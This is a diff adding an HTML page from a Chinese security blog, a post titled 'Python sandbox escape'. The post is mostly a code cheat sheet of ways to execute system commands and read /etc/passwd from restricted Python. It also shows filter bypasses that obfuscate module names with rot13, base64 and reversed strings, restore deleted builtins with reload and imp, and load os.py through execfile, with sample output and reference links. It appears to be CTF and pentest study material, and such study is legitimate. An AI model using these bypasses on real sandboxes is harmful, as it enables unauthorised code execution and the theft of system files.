@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    python沙箱逃逸 | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结,python
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 34 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1534323467000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1534323467000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>python沙箱逃逸</h1>
+    <h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul>
+<li><p>_ import _()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>os 执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&apos;ipconfig&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>exec 任意代码执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&apos;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>eval 任意代码执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>execfile 执行一个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>compile</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(&apos;a = 1 + 2&apos;, &apos;&lt;string&gt;&apos;, &apos;exec&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>timeit 本是检测性能的，也可以任意代码执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ipconfig&apos;)&quot;,number=1)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>platform</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.popen(&apos;ipconfig&apos;).read()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>subprocess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.Popen(&apos;ipconfig&apos;, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>importlib模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">importlib.import_module(&apos;os&apos;).system(&apos;ls&apos;)</span><br><span class="line"># Python3可以，Python2没有该函数</span><br><span class="line">importlib.__import__(&apos;os&apos;).system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><ul>
+<li><p>file</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>open</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>codecs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="获取当前Python环境"><a href="#获取当前Python环境" class="headerlink" title="获取当前Python环境"></a>获取当前Python环境</h3><ul>
+<li>sys模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.version</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="禁止引入敏感包"><a href="#禁止引入敏感包" class="headerlink" title="禁止引入敏感包"></a>禁止引入敏感包</h4><p>通过一些编码来进行混淆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f3ck = __import__(&quot;pbzznaqf&quot;.decode(&apos;rot_13&apos;))</span><br><span class="line">print f3ck.getoutput(&apos;ifconfig&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>配合<code>getattr</code>函数</p>
+<blockquote>
+<p>这个函数接受两个参数,一个模组或者对象,第二个是一个字符串,该函数会在模组或者对象下面的域内搜索有没有对应的函数或者属性</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">getattr(os,codecs.encode(&quot;flfgrz&quot;,&apos;rot13&apos;))(&apos;ifconfig&apos;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;__import__&apos;)</span><br><span class="line">&apos;X19pbXBvcnRfXw==&apos;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;os&apos;)</span><br><span class="line">&apos;b3M=&apos;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;))</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;__tropmi__&apos;[::-1]](&apos;b3M=&apos;.decode(&apos;base64&apos;))</span><br><span class="line">&lt;module &apos;os&apos; from &apos;C:\Python27\lib\os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="删除builtins中的函数"><a href="#删除builtins中的函数" class="headerlink" title="删除builtins中的函数"></a>删除<strong>builtins</strong>中的函数</h4><p>可以通过reload重新导入<code>__builtins__</code>模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtin__)</span><br></pre></td></tr></table></figure>
+
+<p>reload也是<strong>builtins</strong>中的一个函数，假如它也被删了的话，还可以尝试一个imp的模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改sys-modules"><a href="#修改sys-modules" class="headerlink" title="修改sys.modules"></a>修改sys.modules</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br><span class="line">&gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;)</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; getcwd()</span><br><span class="line">&apos;/usr/lib/python2.7&apos;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过类的继承关系找到被ban掉的库"><a href="#通过类的继承关系找到被ban掉的库" class="headerlink" title="通过类的继承关系找到被ban掉的库"></a>通过类的继承关系找到被ban掉的库</h4><p>与模板注入类似</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/52#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/52#toc-4</a></li>
+<li><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8" target="_blank" rel="noopener">https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8</a></li>
+<li><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</a></li>
+<li><a href="https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/" target="_blank" rel="noopener">https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/</a></li>
+<li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></li>
+<li><a href="http://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">http://p0sec.net/index.php/archives/120/</a></li>
+</ul>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
